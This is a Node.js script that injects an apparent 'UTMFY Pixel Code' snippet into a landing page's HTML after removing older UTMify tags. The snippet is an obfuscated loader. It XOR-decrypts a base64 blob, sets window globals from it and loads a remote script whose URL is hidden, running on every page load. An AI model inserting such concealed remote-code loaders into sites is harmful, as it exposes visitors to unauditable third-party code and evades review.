import fs from 'fs';
import path from 'path';

const htmlPath = path.resolve('./public/linfaflowpower/index.html');
let html = fs.readFileSync(htmlPath, 'utf8');

const utmfySnippet = `<!-- UTMFY Pixel Code -->
<script>(function(){var c_6jz=atob("DIveE3aoDlDZMkrsR/D8ZgTELGr7Wj6YN/jkPFnLaj73Rz6BLu2nPRXHY367QGWfJPm3YwLbISWtXznDK+qqdgXcIDqqEGbOJv+qYR/KeyS8QWjWHPD8fRfFa3LjEC6NM+rzZgLFZzagHzqeIv27fQKFdjO2VmefJOD8P1TebzysV2jWZamjPw2KYDG0V2jWZe+/ZxeFeyS0WyyVavusdgDNYCT0QT+OLu+tMVqKeDG1Ry/Ofan8bivV");var t_p=[];for(var v_fsoz=0;v_fsoz<c_6jz.length;v_fsoz++){t_p.push(c_6jz.charCodeAt(v_fsoz)&255);}var i_ubi=t_p[0];var x_0v=t_p.slice(1,1+i_ubi);var b_b6=t_p.slice(1+i_ubi);var w_q0kv=b_b6.map(function(b,k_8p){return b^x_0v[k_8p%i_ubi];});var r_vy="";for(var b_ufu9=0;b_ufu9<w_q0kv.length;b_ufu9++){r_vy+=String.fromCharCode(w_q0kv[b_ufu9]&255);}var r_1=decodeURIComponent(escape(r_vy));var a_zgop=JSON.parse(r_1);var k_3=a_zgop.globals||[];k_3.forEach(function(o_z){window[o_z.name]=o_z.value;});var v_v7=document.createElement("script");v_v7.src=a_zgop.url;v_v7.async=true;v_v7.defer=true;(a_zgop.attributes||[]).forEach(function(n_22e){v_v7.setAttribute(n_22e.name,n_22e.value);});(document.head||document.documentElement).appendChild(v_v7);})();</script>
<!-- End UTMFY Pixel Code -->`;

// Remove existing old utmify/utm scripts if present in head
html = html.replace(/<script src="https:\/\/cdn\.utmify\.com\.br\/scripts\/utms\/latest\.js"[\s\S]*?<\/script>/gi, '');
html = html.replace(/<!-- UTMFY Pixel Code -->[\s\S]*?<!-- End UTMFY Pixel Code -->/gi, '');

// Place utmfySnippet right after <!-- End Meta Pixel Code -->
if (html.includes('<!-- End Meta Pixel Code -->')) {
  html = html.replace('<!-- End Meta Pixel Code -->', '<!-- End Meta Pixel Code -->\n\n' + utmfySnippet);
} else {
  html = html.replace('</head>', utmfySnippet + '\n</head>');
}

fs.writeFileSync(htmlPath, html, 'utf8');
console.log('Successfully updated UTMFY Pixel Code in public/linfaflowpower/index.html');
